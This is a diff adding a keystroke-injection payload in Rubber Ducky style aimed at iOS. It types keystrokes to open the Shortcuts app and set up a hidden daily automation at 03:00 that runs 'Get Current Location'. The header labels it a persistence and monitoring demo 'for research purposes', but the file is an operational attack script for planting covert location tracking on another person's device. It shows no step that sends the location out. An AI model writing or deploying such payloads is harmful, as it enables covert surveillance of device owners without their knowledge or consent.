@@ -1,0 +1,60 @@
+REM Title: iOS Shortcut Persistence Demo
+REM Description: Creates automated shortcuts for monitoring
+REM Target: iOS devices for research purposes
+REM Author: Educational/Research purposes only
+
+DELAY 1000
+REM Open Shortcuts app
+GUI SPACE
+DELAY 1200
+STRING Shortcuts
+DELAY 1200
+ENTER
+DELAY 4000
+
+REM Create new automation
+SHIFT TAB
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 2500
+
+REM Select Automation tab
+STRING Automation
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Create new automation
+ENTER
+DELAY 2000
+
+REM Select time-based trigger
+STRING Time of Day
+DELAY 1000
+ENTER
+DELAY 2000
+
+REM Set automation time
+STRING 03:00
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Configure next steps
+STRING Next
+DELAY 500
+ENTER
+DELAY 2000
+
+REM Add location tracking action
+STRING Get Current Location
+DELAY 1200
+ENTER
+DELAY 1500
+
+REM Complete automation setup
+STRING Done
+DELAY 500
+ENTER
+DELAY 1000
